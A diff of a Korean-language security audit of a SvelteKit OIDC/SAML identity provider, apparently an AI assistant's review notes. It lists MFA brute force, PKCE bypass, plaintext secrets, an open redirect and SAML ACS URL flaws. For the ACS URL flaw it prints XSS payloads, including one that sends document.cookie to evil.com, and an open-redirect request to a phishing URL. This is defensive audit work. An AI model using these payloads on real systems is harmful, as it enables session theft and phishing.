@@ -8,7 +8,7 @@
 4. **hooks에 CSRF 체크 없음** — SvelteKit 기본은 있지만 config에서 끌 수 있음
 5. **세션 쿠키 `sameSite: 'lax'`** — OIDC POST 플로우 때문이긴 한데 CSRF 영향 있음
 
-로그인 엔드포인트랑 OIDC authorize, MFA 플로우 보자.MFA 플로우에 심각한 문제 발견. **MFA brute force가 가능하다.** 
+로그인 엔드포인트랑 OIDC authorize, MFA 플로우 보자.MFA 플로우에 심각한 문제 발견. **MFA brute force가 가능하다.**
 
 로그인 단계에는 rate limit 있는데 (`login:{ip}`, 10회/15분) **MFA 검증 단계(`/mfa`)에는 rate limit이 전혀 없음**. TOTP는 6자리 → 한 윈도우 내 1백만 조합인데 실제로는 시간 윈도우 때문에 30~60초 안에 시도해야 돼도 MFA pending 토큰이 5분짜리고 재사용 가능하면 **수천번 시도 가능**.
 
@@ -26,26 +26,33 @@ MFA pending 토큰 로직 보자. 재사용 가능한지.확정. **MFA brute for
 이제 OIDC authorize 보자.OIDC client 구현 및 PKCE 검증 보자.**치명적 결함 2개 발견:**
 
 ### 🔥 1. Client Secret 평문 저장 & 비교
+
 ```typescript
-clientSecret === client.clientSecretHash
+clientSecret === client.clientSecretHash;
 ```
+
 이름은 `clientSecretHash`인데 실제로는 **평문 비교**. 주석에 "M1: 평문 비교"라고 자기도 인정함. 게다가 `===` 직접 비교라 **타이밍 공격**도 이론상 가능. 더 심각한 건 관리자 UI에서 DB에 접근할 수 있는 사용자나 DB 유출 시 즉시 모든 client secret 노출.
 
 ### 🔥 2. PKCE `plain` 수락
+
 `verifyPkce`가 `plain` 메소드를 수락한다. authorize에서 `client.requirePkce && method !== 'S256'` 체크를 하긴 하는데, **`requirePkce=false` 클라이언트가 `plain`으로 PKCE를 걸면 수락된다**. plain PKCE는 authorization code 탈취 시 verifier=challenge라 보호가 안됨. 근데 이거보다 더 큰 문제는 **PKCE 없는 public client로 등록되면 PKCE 자체가 bypass 됨**:
 
 authorize에서:
+
 ```typescript
 if (client.requirePkce) {
   if (!codeChallenge) { ... }  // challenge 없으면 fail
 }
 ```
+
 → `requirePkce=false`면 challenge 안줘도 OK
 
 grant 생성 시 `codeChallenge: null` 저장 → token 엔드포인트에서:
+
 ```typescript
 if (grant.codeChallenge) { ... PKCE 검증 ... }
 ```
+
 → null이면 검증 skip
 
 클라이언트가 `tokenEndpointAuthMethod === 'none'` (public client)이고 `requirePkce=false`면 **그냥 authorization code 탈취하면 토큰 발급 가능**. 그리고:
@@ -59,12 +66,15 @@ public client는 **client_secret 검증 자체를 skip**. redirect_uri 리스트
 근데 public client가 기본으로 만들어지는지 확인해야 함. 관리자가 PKCE required 걸면 보호는 되니까. 기본값이 뭔지 schema 보자.
 
 ### 🔥 3. `parseBasicAuth`에 URL 디코딩 없음
-Basic auth RFC에 따르면 client_id/secret에 `:`가 포함되면 URL 인코딩해야 함. 근데 이거보다 먼저 **RFC 6749는 application/x-www-form-urlencoded 디코딩을 요구**한다. `client_id`나 `client_secret`에 `%`, `+`, `:` 같은게 있으면 잘못 파싱됨. 실제 보안 영향은 제한적이지만 spec 위반.ㅇㅋ 기본값은 `requirePkce=true`, `client_secret_basic`. 기본값으로는 안전. 근데 관리자 UI에서 끌 수 있다. 관리자 UI의 OIDC client 생성 보자.관리자 레이아웃 가드 확인.**추가 찾음:** 
+
+Basic auth RFC에 따르면 client_id/secret에 `:`가 포함되면 URL 인코딩해야 함. 근데 이거보다 먼저 **RFC 6749는 application/x-www-form-urlencoded 디코딩을 요구**한다. `client_id`나 `client_secret`에 `%`, `+`, `:` 같은게 있으면 잘못 파싱됨. 실제 보안 영향은 제한적이지만 spec 위반.ㅇㅋ 기본값은 `requirePkce=true`, `client_secret_basic`. 기본값으로는 안전. 근데 관리자 UI에서 끌 수 있다. 관리자 UI의 OIDC client 생성 보자.관리자 레이아웃 가드 확인.**추가 찾음:**
 
 ### 🔥 관리자 로그인에 MFA가 **강제되지 않음**
-`if (await hasTotpCredential(db, user.id))`. 관리자가 MFA 안걸어놓으면 패스워드만으로 로그인됨. bootstrap admin에 TOTP 설정 안하면 관리자 계정은 패스워드 하나로 뚫림. IP당 15분당 10회 + PBKDF2 100k 회 = 100k × 10회 = 초당 200만번? 아니, PBKDF2 100k iteration은 ~100ms 걸림. 10회 × (15분 * N개 프록시 IP) = 분산 brute force 가능.
+
+`if (await hasTotpCredential(db, user.id))`. 관리자가 MFA 안걸어놓으면 패스워드만으로 로그인됨. bootstrap admin에 TOTP 설정 안하면 관리자 계정은 패스워드 하나로 뚫림. IP당 15분당 10회 + PBKDF2 100k 회 = 100k × 10회 = 초당 200만번? 아니, PBKDF2 100k iteration은 ~100ms 걸림. 10회 × (15분 \* N개 프록시 IP) = 분산 brute force 가능.
 
 ### 🔥 Admin login + 일반 login rate limit 키 분리
+
 `admin-login:{ip}` vs `login:{ip}` 각각 10회 → **한 IP에서 20회** 가능. 그리고 둘 다 같은 사용자를 대상으로 할 수 있음(관리자 로그인도 `authenticateLocalUser` 씀). 그냥 버그 정도.
 
 이제 **redirect_uri 검증 로직**이 정확히 exact match인지 확인했고 — `parseRedirectUris(client).includes(redirectUri)` — exact string match라서 open redirect는 안됨. 근데 **logout에 open redirect** 있을 수 있음.### 🔥 SAML SLO에 **Open Redirect** 있음!
@@ -77,11 +87,13 @@ throw redirect(302, dest);
 `RelayState` 파라미터가 `https://` 또는 `http://` 으로 시작하면 **무조건 리다이렉트**. 화이트리스트 전혀 없음. `GET /saml/slo?RelayState=https://evil.com/phishing` 요청하면 idp.hyochan.site 도메인을 경유해서 피싱 사이트로 보냄. IDP가 신뢰받는 도메인인 만큼 피싱 효과 극대화.
 
 ### 🔥 OIDC end-session에 **PostLogoutRedirectUri 파싱 버그**
+
 ```typescript
 const allowed = client.postLogoutRedirectUris.split(',').map((u) => u.trim());
 ```
 
 근데 **관리자 UI에서 저장할 때**는 `parseUris`를 써서 **JSON 배열**로 저장:
+
 ```typescript
 postLogoutRedirectUris: postLogoutUrisRaw ? parseUris(postLogoutUrisRaw) : null,
 ```
@@ -91,29 +103,36 @@ postLogoutRedirectUris: postLogoutUrisRaw ? parseUris(postLogoutUrisRaw) : null,
 이제 SAML 검증 로직 보자. SAML은 XML 공격 많음.여기도 **치명적 문제 많음**:
 
 ### 🔥 ACS URL 검증 안됨 → SAML Response 탈취
+
 ```typescript
 const acsUrl = authnRequest.acsUrl ?? sp.acsUrl;
 ```
+
 AuthnRequest에서 **AssertionConsumerServiceURL을 받아서 바로 사용**. 공격자가 자기 AssertionConsumerServiceURL이 박힌 AuthnRequest를 보내면 IdP가 **서명된 SAML assertion을 공격자 서버로 POST**해줌. SAML 표준에서는 AssertionConsumerServiceURL을 SP 메타데이터와 대조해야 함. 이거 **CVE 급** 이슈다.
 
 ### 🔥 HTML Injection → XSS (RelayState)
+
 ```typescript
 const relayStateInput = relayState
-  ? `<input type="hidden" name="RelayState" value="${relayState.replace(/"/g, '&quot;')}">`
-  : '';
+	? `<input type="hidden" name="RelayState" value="${relayState.replace(/"/g, '&quot;')}">`
+	: '';
 ```
+
 `"`만 escape하고 `<`, `>`, `&`는 그대로. `RelayState=abc"><script>alert(1)</script>`로 주면 `"`는 escape되지만, 근데 input value 안이라 ... 확인하자. `value="abc&quot;><script>"` → **quot로 escape 되니까 value는 `abc">...` 문자열이 되긴 함**. 즉 innerHTML이 아니라 value라 실제 script 실행은 안됨. 근데:
 
 **`action="${acsUrl.replace(/"/g, '&quot;')}"` 이게 문제.** 공격자가 AuthnRequest에 `AssertionConsumerServiceURL="javascript:alert(1)"` 넣으면:
+
 - acsUrl은 검증 안되므로 그대로 통과
 - action 속성에 들어감 → `javascript:` URL로 폼 submit
 - **XSS 성공**: idp.hyochan.site 도메인 컨텍스트에서 JS 실행 → 세션 쿠키 탈취
 
 ### 🔥 HTML escape 미완
+
 `acsUrl.replace(/"/g, '&quot;')` — `<`, `>` 안 escape됨. `acsUrl`에 `"><script>...</script><form action="` 같은거 넣으면 완전한 XSS.
 
 ### 🔥 samlResponseB64 / relayState 이스케이프 없음
-`SAMLResponse value="${samlResponseB64}"` — samlResponseB64는 base64라 `"` 없어서 괜찮은데, relayState는 `"`만 처리. `<script>` 태그 자체는 input value 안에선 실행 안되지만 value 밖으로 break out 가능한지? `<>` 안 escape하지만 value는 parsing 맥락상 `"`로 닫히니까 `"` escape만으로 충분. 근데 **` 없는 백틱이나 싱글쿼트는 문제 없지만 `<`는 괜찮음(HTML attr 내부에서 `<`는 리터럴)**. 이 부분은 ok.
+
+`SAMLResponse value="${samlResponseB64}"` — samlResponseB64는 base64라 `"` 없어서 괜찮은데, relayState는 `"`만 처리. `<script>` 태그 자체는 input value 안에선 실행 안되지만 value 밖으로 break out 가능한지? `<>` 안 escape하지만 value는 parsing 맥락상 `"`로 닫히니까 `"` escape만으로 충분. 근데 **`없는 백틱이나 싱글쿼트는 문제 없지만`<`는 괜찮음(HTML attr 내부에서 `<`는 리터럴)**. 이 부분은 ok.
 
 ACS URL XSS가 핵심이다. 이제 서명 키 암호화랑 몇 개 더 보자.서명 키 암호화는 괜찮아보임. 근데 **MFA pending token, access token, signing key 래핑에 모두 같은 `signingKeySecret` 사용** → 키 분리 원칙 위반. 한 쪽이 뚫리면 전부 뚫림. HKDF context는 다르지만 같은 root secret.
 
@@ -126,6 +145,7 @@ audit 로그와 XML 파싱 쪽 보자. XXE 가능성.DOMParser로 SAML AuthnRequ
 SAML response 생성 쪽도 간단히 보자.여기도 하나 더. user 속성을 XML로 넣을 때 xmlEscape는 쓰는데, SP가 이 assertion을 파싱하는 관점에선 문제없음. 근데:
 
 ### 🔥 username이 `${xmlEscape(nameId)}` 같은 식으로 들어가는지 확인해야 함
+
 user.displayName, username 등은 **관리자가 또는 LDAP/자기가 등록**. 자기 username에 `<!ENTITY ...>` 같은걸 넣어서 뭐 해보려해도 xmlEscape하면 단순 XSS는 안됨.
 
 LDAP 쪽 보자. LDAP injection 가능성.---
@@ -139,6 +159,7 @@ LDAP 쪽 보자. LDAP injection 가능성.---
 ### 1. **ACS URL 미검증 → SAML Response 탈취 (CVE-급)**
 
 `src/routes/saml/sso/+server.ts:50` 부근:
+
 ```typescript
 const acsUrl = authnRequest.acsUrl ?? sp.acsUrl;
 ```
@@ -154,8 +175,9 @@ GET /saml/sso?SAMLRequest=<공격자가_만든_AuthnRequest_with_ACS=evil.com>
 ### 2. **ACS URL을 통한 DOM XSS**
 
 같은 파일:
+
 ```typescript
-`<form id="samlForm" method="POST" action="${acsUrl.replace(/"/g, '&quot;')}">`
+`<form id="samlForm" method="POST" action="${acsUrl.replace(/"/g, '&quot;')}">`;
 ```
 
 `"`만 replace, `<>&` 전부 raw. 거기에 `acsUrl` 자체가 AuthnRequest에서 온 attacker-controlled. 페이로드:
@@ -165,6 +187,7 @@ AssertionConsumerServiceURL="javascript:fetch('https://evil.com/'+document.cooki
 ```
 
 또는 attribute breakout:
+
 ```
 AssertionConsumerServiceURL=</form><script>...</script><form action=
 ```
@@ -196,6 +219,7 @@ AssertionConsumerServiceURL=</form><script>...</script><form action=
 ### 5. **Client Secret 평문 저장 + `===` 비교**
 
 `src/lib/server/oidc/client.ts`:
+
 ```typescript
 return Boolean(client.clientSecretHash && clientSecret && clientSecret === client.clientSecretHash);
 ```
@@ -207,6 +231,7 @@ return Boolean(client.clientSecretHash && clientSecret && clientSecret === clien
 ### 6. **SAML SLO Open Redirect**
 
 `src/routes/saml/slo/+server.ts`:
+
 ```typescript
 const dest = relayState && /^https?:\/\//.test(relayState) ? relayState : '/';
 throw redirect(302, dest);
@@ -217,11 +242,13 @@ throw redirect(302, dest);
 ### 7. **OIDC end-session PostLogoutRedirectUris 파싱 불일치**
 
 저장은 JSON 배열로:
+
 ```typescript
-redirectUris: parseUris(redirectUrisRaw)  // JSON.stringify(...)
+redirectUris: parseUris(redirectUrisRaw); // JSON.stringify(...)
 ```
 
 읽기는 콤마 split으로:
+
 ```typescript
 const allowed = client.postLogoutRedirectUris.split(',').map((u) => u.trim());
 ```
@@ -239,15 +266,19 @@ const allowed = client.postLogoutRedirectUris.split(',').map((u) => u.trim());
 ## 🟡 Medium
 
 ### 10. **CSP `script-src 'unsafe-inline'`**
+
 SvelteKit SSR 때문에 어쩔 수 없다는 주석이지만, XSS 방어선 무너짐. `unsafe-inline` 빼고 nonce 기반으로 가는게 정석.
 
 ### 11. **키 분리 안됨**
+
 `IDP_SIGNING_KEY_SECRET` 하나로: (a) private JWK 래핑 KEK (b) MFA pending 토큰 HMAC (c) access token HMAC (d) TOTP 시크릿 래핑 KEK. HKDF context 다르긴 해도 root가 같음. 하나 뚫리면 전부.
 
 ### 12. **AuthnRequest 서명 검증 없음**
+
 SP 메타데이터에 서명 요구가 있어도 코드에 검증 로직 자체가 없음. 조합하면 #1의 공격 조건이 더 쉬워짐.
 
 ### 13. **세션 `sameSite: 'lax'`**
+
 OIDC/SAML POST 바인딩 땜에 어쩔 수 없긴 한데, GET 기반 CSRF 여지는 남음.
 
 ---
